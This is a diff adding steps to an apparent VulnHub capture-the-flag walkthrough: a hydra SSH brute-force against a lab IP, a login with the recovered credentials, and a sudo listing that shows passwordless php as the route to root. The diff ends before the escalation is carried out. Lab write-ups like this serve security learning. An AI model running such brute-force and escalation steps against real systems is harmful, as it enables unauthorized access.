@@ -92,3 +92,44 @@ indONEsia
 qwerty!!!
 skuyatuh
 ```
+
+
+### 3.Gaining Shell
+
+Save these two lists and try to brute force the ssh service :
+
+
+```bash
+hydra -L users.txt   -P passwords.txt 192.168.127.134 ssh -v -t 10 
+```
+
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/cc9f0f26-89ad-4653-b22c-4b3ec4a45d5b)
+
+
+now login to system with `alice : 4lic3` :
+
+```bash
+root@kali: ssh alice@192.168.127.134                                                                                                               
+alice@192.168.127.134's password: 
+Last login: Sun Apr 28 16:50:29 2024 from 192.168.127.128
+alice@gfriEND:~$ id
+uid=1000(alice) gid=1001(alice) groups=1001(alice)
+```
+
+### 4.Privilege Escalation
+
+Check sudo permissions on the system :
+
+```bash
+alice@gfriEND:~$ sudo -l
+Matching Defaults entries for alice on gfriEND:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on gfriEND:
+    (root) NOPASSWD: /usr/bin/php
+```
+
+
+
+
+
